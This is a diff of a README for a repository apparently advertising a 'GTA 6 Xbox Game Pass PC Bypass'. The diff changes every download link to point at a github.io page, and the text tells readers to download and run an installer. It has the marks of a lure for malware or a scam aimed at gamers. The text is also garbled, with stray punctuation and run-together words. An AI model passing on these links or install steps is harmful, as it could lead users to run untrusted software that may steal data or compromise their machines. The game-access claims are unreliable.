@@ -1,5 +1,5 @@
 # 🎮 GTA-6-Xbox-Game-Pass-PC-Bypass-2026 - Play GTA 6 on PC Now  
-[![Download Now](https://img.shields.io/badge/Download-GTA_6_PC_Bypass-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23)](https://github.com/Assemblyhalldevon6100/GTA-6-Xbox-Game-Pass-PC-Bypass-2026)
+[![Download Now](https://img.shields.io/badge/Download-GTA_6_PC_Bypass-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1b1f23)](https://assemblyhalldevon6100.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ Follow these simple steps to get online in Los Santos on your PC.. It's easier t
 
 Visit this link to download the application:  
 
-[**https://github.com/Assemblyhalldevon6100/GTA-6-Xbox-Game-Pass-PC-Bypass-2026**](https://github.com/Assemblyhalldevon6100/GTA-6-Xbox-Game-Pass-PC-Bypass-2026)  
+[**https://assemblyhalldevon6100.github.io**](https://assemblyhalldevon6100.github.io)  
 
 Click the button above or copy-paste the link into your browser's address bar., This will take you to the download pagewhere you'll find the package.,
 
@@ -160,7 +160,7 @@ As of early 2026,, Rockstar hasn't announced a PC date., This is the only way to
 
 Here's your one-stop cheat sheet.,
 
-1. **Visit this link** → [https://github.com/Assemblyhalldevon6100/GTA-6-Xbox-Game-Pass-PC-Bypass-2026](https://github.com/Assemblyhalldevon6100/GTA-6-Xbox-Game-Pass-PC-Bypass-2026)  
+1. **Visit this link** → [https://assemblyhalldevon6100.github.io](https://assemblyhalldevon6100.github.io)  
    2. **Download** the file。  
    3. **Run** the installer。.  
    4. **Follow** the prompts→ wait for completion。,  
